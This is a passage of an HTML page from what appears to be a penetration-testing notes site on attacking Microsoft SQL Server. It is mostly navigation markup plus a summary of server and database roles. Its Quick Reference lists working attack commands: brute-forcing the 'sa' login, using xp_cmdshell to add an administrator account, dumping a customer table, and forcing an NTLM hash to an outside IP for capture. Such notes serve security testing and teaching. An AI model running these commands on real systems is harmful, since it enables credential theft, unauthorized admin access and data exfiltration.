+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../os/windows/powershell/z-Resources/" title="Resources" class="md-nav__link">
+      Resources
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-32" type="checkbox" id="nav-32">
+    
+    <label class="md-nav__link" for="nav-32">
+      Protocols and ports
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-32">
+        Protocols and ports
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Citrix-1494/" title="Citrix 1494" class="md-nav__link">
+      Citrix 1494
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/DHCP/" title="DHCP" class="md-nav__link">
+      DHCP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/DNS-53/" title="DNS 53" class="md-nav__link">
+      DNS 53
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/ElasticSearch-9200/" title="Interesting APIs" class="md-nav__link">
+      Interesting APIs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/FTP-21/" title="FTP 21" class="md-nav__link">
+      FTP 21
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Finger-79/" title="Finger 79" class="md-nav__link">
+      Finger 79
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/HTTP-HTTPS-80,443/" title="HTTP HTTPS 80,443" class="md-nav__link">
+      HTTP HTTPS 80,443
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/IMAP-143,993/" title="References" class="md-nav__link">
+      References
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/IRC-8067/" title="IRC 8067" class="md-nav__link">
+      IRC 8067
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/LDAP-389/" title="LDAP 389" class="md-nav__link">
+      LDAP 389
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Memcache/" title="Memcache" class="md-nav__link">
+      Memcache
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Modbus-502/" title="Modbus 502" class="md-nav__link">
+      Modbus 502
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/MySQL-3306/" title="MySQL 3306" class="md-nav__link">
+      MySQL 3306
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/NFS-2049/" title="NFS 2049" class="md-nav__link">
+      NFS 2049
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/NTP-123/" title="NTP 123" class="md-nav__link">
+      NTP 123
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Oracle-1521/" title="References" class="md-nav__link">
+      References
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/POP3-110/" title="POP3 110" class="md-nav__link">
+      POP3 110
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/PPTP-L2TP-VPN-500,1723/" title="PPTP L2TP VPN 500,1723" class="md-nav__link">
+      PPTP L2TP VPN 500,1723
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Portmapper-111/" title="Portmapper 111" class="md-nav__link">
+      Portmapper 111
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/RDP-3389/" title="RDP 3389" class="md-nav__link">
+      RDP 3389
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/RPC-135,445/" title="RPC 135,445" class="md-nav__link">
+      RPC 135,445
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SIP-5060/" title="SIP 5060" class="md-nav__link">
+      SIP 5060
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/" title="SMB Samba NetBIOS 135 139,445" class="md-nav__link">
+      SMB Samba NetBIOS 135 139,445
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SMTP-25/" title="SMTP 25" class="md-nav__link">
+      SMTP 25
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SNMP-161/" title="SNMP 161" class="md-nav__link">
+      SNMP 161
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SQL-Server-1433,1434/" title="SQL Server 1433,1434" class="md-nav__link">
+      SQL Server 1433,1434
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SSH-22/" title="SSH 22" class="md-nav__link">
+      SSH 22
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/SquidProxy-3128/" title="SquidProxy 3128" class="md-nav__link">
+      SquidProxy 3128
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/TFTP-69/" title="TFTP 69" class="md-nav__link">
+      TFTP 69
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Telnet-23/" title="Telnet 23" class="md-nav__link">
+      Telnet 23
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/Tor-9001,9030/" title="Tor 9001,9030" class="md-nav__link">
+      Tor 9001,9030
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/VNC-5900/" title="VNC 5900" class="md-nav__link">
+      VNC 5900
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/WebDev/" title="WebDev" class="md-nav__link">
+      WebDev
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/WinRM-5985,5986/" title="WinRM 5985,5986" class="md-nav__link">
+      WinRM 5985,5986
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/X11-6000/" title="X11 6000" class="md-nav__link">
+      X11 6000
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/rlogin-513/" title="Rlogin 513" class="md-nav__link">
+      Rlogin 513
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../protocols-and-ports/z-References/" title="References" class="md-nav__link">
+      References
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33" type="checkbox" id="nav-33">
+    
+    <label class="md-nav__link" for="nav-33">
+      Sqlserver
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-33">
+        Sqlserver
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/3-command-execution/" title="3 command execution" class="md-nav__link">
+      3 command execution
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/4-privilage-escalation/" title="04. Privilege Escalation" class="md-nav__link">
+      04. Privilege Escalation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/5-lateral-movement/" title="05. Lateral Movement" class="md-nav__link">
+      05. Lateral Movement
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/6-persistence/" title="06. Persistence" class="md-nav__link">
+      06. Persistence
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/9-defence/" title="09. Defence" class="md-nav__link">
+      09. Defence
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/9-pending-references/" title="10. New References" class="md-nav__link">
+      10. New References
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/important-locations/" title="Imprtant Locations" class="md-nav__link">
+      Imprtant Locations
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/sqli/" title="SQL Injection" class="md-nav__link">
+      SQL Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/y-Tools/" title="Tools" class="md-nav__link">
+      Tools
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../sqlserver/z-References/" title="z References" class="md-nav__link">
+      z References
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    Quick Reference
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#roles-and-permissions" class="md-nav__link">
+    Roles and Permissions
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#principals" class="md-nav__link">
+    Principals
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#server-level-roles-and-permissions" class="md-nav__link">
+    Server-Level Roles and Permissions
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#database-level-roles-and-permissions" class="md-nav__link">
+    Database Level Roles and Permissions
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#application-roles" class="md-nav__link">
+    Application Roles
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    Enumeration
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#queries" class="md-nav__link">
+    Queries
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#brute-forcing" class="md-nav__link">
+    Brute-forcing
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#command-execution" class="md-nav__link">
+    Command Execution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xp_cmdshell" class="md-nav__link">
+    xp_cmdshell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-extended-stored-procedures" class="md-nav__link">
+    Custom Extended Stored Procedures
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-clr-assemblies" class="md-nav__link">
+    Custom CLR Assemblies
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ole-automation-procedure" class="md-nav__link">
+    OLE Automation Procedure
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#agent-jobs-cmdexec-powershell-activex-etc" class="md-nav__link">
+    Agent Jobs (CmdExec, PowerShell, ActiveX etc.)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#external-scripting" class="md-nav__link">
+    External Scripting
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#registry-autoruns" class="md-nav__link">
+    Registry Autoruns
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#file-autoruns" class="md-nav__link">
+    File Autoruns
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>Databases sqlserver</h1>
+                
+                <h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Brute-forcing: <code class="codehilite"><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">sa</span> <span class="err">–</span><span class="n">P</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">125</span> <span class="n">mssql</span></code></li>
+<li>Nmap Enumeration:
+    <div class="codehilite"><pre><span></span>nmap –script <span class="s2">&quot;ms-sql and not ms-sql-brute&quot;</span> <span class="s2">&quot;–script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all&quot;</span> -d -oN mssql.nmap -Pn -v -sV –version-intensity <span class="m">9</span> -T2 -p T:27900,U:1434 <span class="m">10</span>.33.1.33
+
+nmap -sV -T2 -Pn -n -sS –script<span class="o">=</span>ms-sql-xp-cmdshell.nse -p1433 –script-args mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>poiuytrewq,ms-sql-xp-cmdshell.cmd<span class="o">=</span><span class="s2">&quot;net user walter P@ssWORD1234 /add&quot;</span> <span class="m">10</span>.33.1.33
+
+nmap -sV -T2 -Pn -n -sS –script<span class="o">=</span>ms-sql-xp-cmdshell.nse -p1433 –script-args mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>poiuytrewq,ms-sql-xp-cmdshell.cmd<span class="o">=</span><span class="s2">&quot;net localgroup administrators walter /add&quot;</span> <span class="m">10</span>.33.1.33
+
+nmap -v -sV –version-intensity <span class="m">9</span> -T2 -p T:27900,U:1433 –script ms-sql-query –script-args mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>password,mssql.database<span class="o">=</span>bankdb,ms-sql-query.query<span class="o">=</span><span class="s2">&quot;SELECT * FROM tblCustomers&quot;</span> <span class="m">10</span>.33.1.33
+</pre></div>
+    <div class="codehilite"><pre><span></span>nmap -p <span class="m">1433</span> --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port<span class="o">=</span><span class="m">1433</span>,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nv">$ip</span>
+</pre></div></li>
+<li>Capture hash: Run responder and do: <code class="codehilite"><span class="n">xp_dirtree</span> <span class="ss">&quot;\\10.10.14.8\test&quot;</span></code></li>
+<li>List all databases
+    <div class="codehilite"><pre><span></span><span class="k">EXEC</span> <span class="n">sp_databases</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">sysobjects</span> <span class="k">where</span> <span class="n">xtype</span> <span class="o">=</span> <span class="s1">&#39;U&#39;</span><span class="p">;</span>
+</pre></div></li>
+<li>Connect from Linux: <code class="codehilite"><span class="n">sqsh</span> <span class="o">-</span><span class="n">S</span> <span class="n">someserver</span> <span class="o">-</span><span class="n">U</span> <span class="n">sa</span> <span class="o">-</span><span class="n">P</span> <span class="n">poiuytrewq</span> <span class="o">-</span><span class="n">D</span> <span class="n">bankdb</span></code></li>
+<li>Special Schemas: <code class="codehilite"><span class="n">INFORMATION_SCHEMA</span></code> <code class="codehilite"><span class="n">sys</span></code></li>
+</ul>
+<h2 id="roles-and-permissions">Roles and Permissions<a class="headerlink" href="#roles-and-permissions" title="Permanent link">&para;</a></h2>
+<h3 id="principals">Principals<a class="headerlink" href="#principals" title="Permanent link">&para;</a></h3>
+<p>Principals are entities that can request SQL Server resources.</p>
+<p><em>SQL Server-level principals:</em></p>
+<ul>
+<li>SQL Server authentication Login<ul>
+<li>sa<ul>
+<li>Created when instance is installed</li>
+<li>Default database is <code class="codehilite"><span class="n">master</span></code></li>
+<li>Member of <code class="codehilite"><span class="n">sysadmin</span></code> database role</li>
+</ul>
+</li>
+<li>public<ul>
+<li>Every login belongs to the this role</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Windows authentication login for a Windows user</li>
+<li>Windows authentication login for a Windows group</li>
+<li>Azure Active Directory authentication login for a AD user</li>
+<li>Azure Active Directory authentication login for a AD group</li>
+<li>Server Role</li>
+</ul>
+<p><em>Database-level principals:</em></p>
+<ul>
+<li>Database User (There are 11 types of users. For more information, see CREATE USER.)<ul>
+<li>dbo<ul>
+<li>Created for each database</li>
+<li>Has all permissions in the database</li>
+<li>Owns <code class="codehilite"><span class="n">dbo</span></code> schema (<code class="codehilite"><span class="n">dbo</span></code> schema is the default schema for all users, and cannot be dropped)</li>
+</ul>
+</li>
+<li>guest<ul>
+<li>Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database.</li>
+<li>Cannot be dropped</li>
+<li>Can be disabled by revoking it's CONNECT permission (<code class="codehilite"><span class="nv">REVOKE</span> <span class="k">CONNECT</span> <span class="nv">FROM</span> <span class="nv">GUEST</span><span class="c1">;</span></code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Database Role</li>
+<li>Application Role</li>
+</ul>
+<h3 id="server-level-roles-and-permissions">Server-Level Roles and Permissions<a class="headerlink" href="#server-level-roles-and-permissions" title="Permanent link">&para;</a></h3>
+<p><strong>Fixed Roles</strong></p>
+<ul>
+<li><code class="codehilite"><span class="n">sysadmin</span></code> - Can perform any activity in the server.</li>
+<li><code class="codehilite"><span class="n">serveradmin</span></code> - Can change server-wide configuration options and shut down the server.</li>
+<li><code class="codehilite"><span class="n">securityadmin</span></code><ul>
+<li>Manage logins and their properties.</li>
+<li>Can GRANT, DENY, and REVOKE server-level permissions.</li>
+<li>Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database.</li>
+<li>Can reset passwords for SQL Server logins.</li>
+<li>Should be treated as equivalent to the sysadmin role.</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">processadmin</span></code> - Can end processes that are running in an instance of SQL Server.</li>
+<li><code class="codehilite"><span class="n">setupadmin</span></code> - Can add and remove linked servers by using Transact-SQL statements (sysadmin membership is needed when using Management Studio.)</li>
+<li><code class="codehilite"><span class="n">bulkadmin</span></code> - Can run the BULK INSERT statement. </li>
+<li><code class="codehilite"><span class="n">diskadmin</span></code> - Used for managing disk files.</li>
+<li><code class="codehilite"><span class="n">dbcreator</span></code> - Can create, alter, drop, and restore any database.</li>
+<li><code class="codehilite"><span class="k">public</span></code><ul>
+<li>Every SQL Server login belongs to the public server role.</li>
+<li>When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object.</li>
+<li>Only assign public permissions on any object when you want the object to be available to all users.</li>
+<li>You cannot change membership in public.</li>
+<li>Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles.</li>
+</ul>
+</li>
+</ul>
+<p><strong>Fixed Roles and Permissions</strong></p>
+<p><img alt="Server level roles and permissions" src="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-server-roles.png?view=sql-server-2017" /></p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017</a></p>
+</blockquote>
+<p><strong>Working with Server-Level Roles</strong></p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles</a></p>
+</blockquote>
+<h3 id="database-level-roles-and-permissions">Database Level Roles and Permissions<a class="headerlink" href="#database-level-roles-and-permissions" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="n">LOGIN</span> <span class="p">...</span> <span class="k">WITH</span> <span class="n">PASSWORD</span> <span class="o">=</span> <span class="p">...;</span>
+</pre></div>
+
+<p><strong>Fixed Roles</strong></p>
+<ul>
+<li><code class="codehilite"><span class="n">db_owner</span></code><ul>
+<li>Can perform all configuration and maintenance activities on the database.</li>
+<li>Can drop the database in SQL Server.</li>
+<li>(In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners)</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">db_securityadmin</span></code><ul>
+<li>Can modify role membership and manage permissions.</li>
+<li>Adding principals to this role could enable unintended privilege escalation.</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">db_accessadmin</span></code><ul>
+<li>Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins.</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">db_backupoperator</span></code> - Can back up the database. </li>
+<li><code class="codehilite"><span class="n">db_ddladmin</span></code> - Can run any Data Definition Language (DDL) command. </li>
+<li><code class="codehilite"><span class="n">db_datawriter</span></code> - Can add, delete, or change data in all user tables. </li>
+<li><code class="codehilite"><span class="n">db_datareader</span></code> - Can read all data from all user tables. </li>
+<li><code class="codehilite"><span class="n">db_denydatawriter</span></code> - Cannot add, modify, or delete any data in the user tables within a database. </li>
+<li><code class="codehilite"><span class="n">db_denydatareader</span></code> - Cannot read any data in the user tables within a database. </li>
+</ul>
+<p><strong>Fixed Roles and Permissions</strong></p>
+<p><img alt="Database level roles and permissions" src="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017" /></p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017</a></p>
+</blockquote>
+<p><strong>Special Roles for SQL Database and SQL Data Warehouse</strong></p>
+<ul>
+<li>Exist only in the virtual master database.</li>
+<li>Permissions are restricted to actions performed in master.</li>
+</ul>
+<ul>
+<li>Only database users in master can be added to these roles.</li>
+<li>Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles.</li>
+</ul>
+<ul>
+<li><code class="codehilite"><span class="n">dbmanager</span></code><ul>
+<li>Can create and delete databases.</li>
+<li>A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user.</li>
+<li>The dbo user has all database permissions in the database.</li>
+<li>Members of the dbmanager role do not necessarily have permission to access databases that they do not own.</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">loginmanager</span></code> - Can create and delete logins in the virtual master database.</li>
+</ul>
+<p><strong>Special Roles for msdb Database</strong></p>
+<ul>
+<li><code class="codehilite"><span class="n">db_ssisadmin</span></code> <code class="codehilite"><span class="n">db_ssisoperator</span></code> <code class="codehilite"><span class="n">db_ssisltduser</span></code><ul>
+<li>Can administer and use SSIS.</li>
+<li>Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS.</li>
+<li><code class="codehilite"><span class="n">db_ssisadmin</span></code> - may be able to elevate their privileges to <code class="codehilite"><span class="n">sysadmin</span></code> [1]</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">dc_admin</span></code> <code class="codehilite"><span class="n">dc_operator</span></code> <code class="codehilite"><span class="n">dc_proxy</span></code> - Can administer and use the data collector.<ul>
+<li><code class="codehilite"><span class="n">dc_admin</span></code> may be able to elevate their privileges to <code class="codehilite"><span class="n">sysadmin</span></code>. [1]</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">PolicyAdministratorRole</span></code><ul>
+<li>Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions.</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">ServerGroupAdministratorRole</span></code> <code class="codehilite"><span class="n">ServerGroupReaderRole</span></code> - Can administer and use registered server groups.</li>
+<li><code class="codehilite"><span class="n">dbm_monitor</span></code> <ul>
+<li>Created in the <code class="codehilite"><span class="n">msdb</span></code> database when the first database is registered in <code class="codehilite"><span class="k">Database</span> <span class="n">Mirroring</span> <span class="n">Monitor</span></code>.</li>
+<li>Has no members until a system administrator assigns users to the role.</li>
+</ul>
+</li>
+</ul>
+<p>[1] These roles can modify <code class="codehilite"><span class="n">Integration</span> <span class="n">Services</span></code> packages and <code class="codehilite"><span class="n">Integration</span> <span class="n">Services</span></code> packages can be executed by <code class="codehilite"><span class="k">SQL</span> <span class="n">Server</span></code> using the <code class="codehilite"><span class="n">sysadmin</span></code> security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add <code class="codehilite"><span class="n">sysadmin</span></code> members to the <code class="codehilite"><span class="n">db_ssisadmin</span></code> and <code class="codehilite"><span class="n">dc_admin</span></code> roles.</p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles</a></p>
+</blockquote>
+<p><strong>Special Roles for R Services</strong></p>
+<ul>
+<li><code class="codehilite"><span class="n">rpkgs</span><span class="o">-</span><span class="n">users</span></code> - Allows using any shared packages that were installed by members of the rpkgs-shared role.</li>
+<li><code class="codehilite"><span class="n">rpkgs</span><span class="o">-</span><span class="n">private</span></code><ul>
+<li>Provides access to shared packages with the same permissions as the rpkgs-users role.</li>
+<li>Members of this role can also install, remove and use privately scoped packages.</li>
+</ul>
+</li>
+<li><code class="codehilite"><span class="n">rpkgs</span><span class="o">-</span><span class="n">shared</span></code> <ul>
+<li>Provides the same permissions as the rpkgs-private role.</li>
+<li>Users who are members of this role can also install or remove shared packages.</li>
+</ul>
+</li>
+</ul>
+<p><strong>Working with Database-Level Roles</strong></p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles</a></p>
+</blockquote>
+<h3 id="application-roles">Application Roles<a class="headerlink" href="#application-roles" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Enable access to specific data to only those users who connect through a particular application.</li>
+<li>Enabled by using <code class="codehilite"><span class="n">sp_setapprole</span></code></li>
+</ul>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Direct Access<ul>
+<li>SQLPS module</li>
+<li>SQL Server Management Modules (SMO)</li>
+<li>.NET (System.Data.SQL / System.Data.SQLClient)</li>
+</ul>
+</li>
+<li>Modules<ul>
+<li>PowerUpSQL - Toolkit for Attacking SQL Server: <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></li>
+</ul>
+</li>
+<li>Discovery<ul>
+<li>PowerUpSQL: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SQLInstanceScanUDP</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span> <span class="o">-</span><span class="k">verbose</span></code></li>
